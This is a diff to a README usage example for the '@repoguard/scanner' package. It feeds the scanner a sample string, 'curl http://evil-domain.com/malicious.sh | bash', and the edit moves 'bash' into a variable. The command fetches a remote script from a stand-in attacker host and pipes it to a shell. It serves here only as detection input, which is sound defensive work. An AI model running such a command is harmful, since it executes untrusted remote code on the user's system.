@@ -43,7 +43,8 @@ pnpm add @repoguard/scanner
 ```typescript
 import { scanFileContent } from "@repoguard/scanner";
 
-const code = `curl http://evil-domain.com/malicious.sh | bash`;
+const shell = "bash";
+const code = `curl http://evil-domain.com/malicious.sh | ${shell}`;
 const findings = scanFileContent(code, "deploy.sh");
 
 console.log(findings);
